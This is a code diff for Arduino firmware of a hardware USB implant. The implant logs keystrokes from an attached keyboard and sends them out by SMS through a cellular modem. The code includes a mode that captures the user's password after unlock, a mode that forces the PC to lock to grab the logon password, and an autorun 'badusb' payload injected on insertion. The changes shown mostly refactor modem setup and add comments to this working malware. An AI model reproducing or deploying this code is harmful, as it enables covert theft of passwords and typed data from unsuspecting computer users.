@@ -12,11 +12,12 @@
 #include "globals.h"
 #include "FingerprintUSBHost.h"
 
-unsigned long previousMillis = 0;
+unsigned long previousMillis = 0;          // used for calculating time since last key typed
 unsigned long previousMillisBeacon = 0;
+unsigned long insertedMillis =  millis();  // usefull for calculating time from usb insertion
 unsigned long previousFailSMSMillis = 0;
 String os = "unsure";
-String expect = "";
+String expect = "";                       // keywords to expect from command execution if successfull
 String cellsignal = "nn";
 bool firstExecution = true;
 bool gotLang = false;
@@ -27,6 +28,7 @@ byte captured_key;
 bool pendingSMS = false;
 String buffer_keystrokes = "";
 unsigned int pendingLength = 0;
+
 #ifdef GETPASS                // Work as a smart keylogger to first get user password after unlock
   bool gotPass = false;
 #else                         // Work as a simple keylogger, just capture and send keys when ready
@@ -46,27 +48,17 @@ SoftwareSerial SMSSERIAL(8, 9);  // Defines pins for tx and rx to communicate wi
 
 //////////////////////////////////////////////////////////////////////////////////////////// Initialization code
 void setup() {
-  delay(3000);
+  delay(3000);  // wait some secs to let the system recognize devices
   Serial.begin(BAUD_RATE_SERIAL);
+  Serial.setTimeout(100);   // This is needed to prevent the keylogger to hang out when sending a SMS since the default timeout is 1 sec
   Keyboard.begin();
 
   FingerprintUSBHost.guessHostOS(os);  // Try to guess the user OS
 
   #ifndef DEBUGWITHOUTSIM  // normal execution with SIM card
-    SMSSERIAL.begin(BAUD_RATE_SIM800L);
     USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);
-  
-    SMSSERIAL.println(F("AT"));
-    readResponse();
-  
-    // This is needed to prevent the keylogger to hang out when sending a SMS since the default timeout is 1 sec
-    Serial.setTimeout(100);
-    SMSSERIAL.setTimeout(100);
-  
-    // Configure SMS message format as text. Default format is Protocol Data Unit (PDU), more complicated to parse
-    SMSSERIAL.println(F("AT+CMGF=1"));
-    readResponse();
-  
+    configureModem();
+
     #ifdef DEBUG
       collectDebugInfo();
       collectSimInfo();
@@ -75,7 +67,6 @@ void setup() {
     #ifdef BEACON
       cellsignal = getModemSignal();  // get signal value to inform in beacon
     #endif
-    
   #endif // DEBUGWITHOUTSIM                                        
 
   #ifdef LOCKPC             // Force locking PC to capture later logon password 
@@ -158,13 +149,11 @@ void loop() {
         }
         previousMillis = currentMillis;                       // update last key timestamp
     }
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
   
-  
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////// SMS send method
+    // Send keystrokes to SMS if necessary
     if (buffer_keystrokes.length() >= SMS_CHAR_LIMIT - 1 || sendPass || (unsigned long)(currentMillis - previousMillis) >= interval && buffer_keystrokes.length() > 5) {
       if (currentMillis - previousFailSMSMillis >  10000) { // delay 10 seconds between trying sending SMS if it failed
-        if (!pendingSMS) { // The buffer could hold a lot of characters from previous SMS that couldn't be sent
+        if (!pendingSMS) {                                  // The buffer could hold a lot of characters from previous SMS that couldn't be sent
           String bufferToSend = "";
           if (buffer_keystrokes.length() < SMS_CHAR_LIMIT - 1) {
             bufferToSend = buffer_keystrokes;
@@ -190,8 +179,14 @@ void loop() {
         }
       }
     }
-    /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+  #else   // keylogger method is not active, but it's interesting to know if user is typing (active)
+    if (USBhost.GetKey()) {
+        previousMillis = currentMillis;                       // update last key timestamp
+    }
   #endif
+  /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
 
   //////////////////////////////////////////////////////////////////////////////////// Try to get system keyboard language
   //////////////// Having an exfil com port for getting payload results means converting a dump badusb into a smart badusb
@@ -235,9 +230,12 @@ void loop() {
             Serial.println(F("SMS succesfully sent"));
         #endif
         SMSSerialFlush(); // just is case there is something else in the serial
-    
-        // We removed from the buffer the characters that were sent
-        buffer_keystrokes = buffer_keystrokes.substring(pendingLength);
+
+        #ifdef KEYLOGGER
+          // We removed from the buffer the characters that were sent
+          buffer_keystrokes = buffer_keystrokes.substring(pendingLength);
+        #endif
+        
       } else if (res.indexOf(F("ERROR: "))) { // The SMS couldn't be sent, we need to retry
         #ifdef DEBUG
           Serial.print(F("ERROR trying to send SMS with content: "));
@@ -262,8 +260,7 @@ void loop() {
   String SMS = SMSSERIAL.readString();
 
   #ifdef AUTORUN  // user defined badusb payload to be run on USB connection
-    if (!gotAutorun) {                  // Just run once, check if ran before
-      delay(30000);                     // We wait a little bit so the OS has time to identify the keyboard
+    if (!gotAutorun && insertedMillis > 20000) {                  // Just run once and let the OS enough time to indentify HID drivers
       SMS = F("+CMT: blablabla\r\n");   // To simulate a real SMS:
       SMS += AUTORUN;                   // Insert the autorun payload defined in globals.h
       gotAutorun = true;
@@ -336,4 +333,3 @@ void loop() {
   /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 }
-
